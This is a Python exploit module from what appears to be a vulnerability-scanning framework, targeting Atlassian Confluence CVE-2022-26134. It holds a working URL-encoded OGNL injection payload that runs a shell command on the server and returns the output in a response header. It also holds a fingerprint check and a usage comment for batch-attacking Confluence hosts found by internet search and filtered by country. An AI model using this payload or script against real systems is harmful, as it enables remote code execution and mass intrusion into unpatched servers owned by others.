# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-11 13:11

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from bs4 import BeautifulSoup

# 966e60f8eb85b7ea43a7b0095f3e2336
# app="ATLASSIAN-Confluence" && country="CN"

# python3 batch.py -m exploit.poc.Atlassian.Confluence.CVE-2022-26134 -cs -fs "app=\"ATLASSIAN-Confluence\" && country=\"CN\""

class Script(BaseScript):
    name = 'Atlassian Confluence'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2022-26134'
        # 来源
        self.bug_refer = 'https://github.com/Nwqda/CVE-2022-26134/blob/master/cve-2022-26134.py'
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"/']
        # 相关信息
        self.info = '''OGNL injection'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and 'id="com-atlassian-confluence' in text and 'name="confluence-base-url"' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False, allow_redirects=False) as response:
                    if response is not None and response.headers.get('X-Cmd-Response', '') and response.status == 302:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

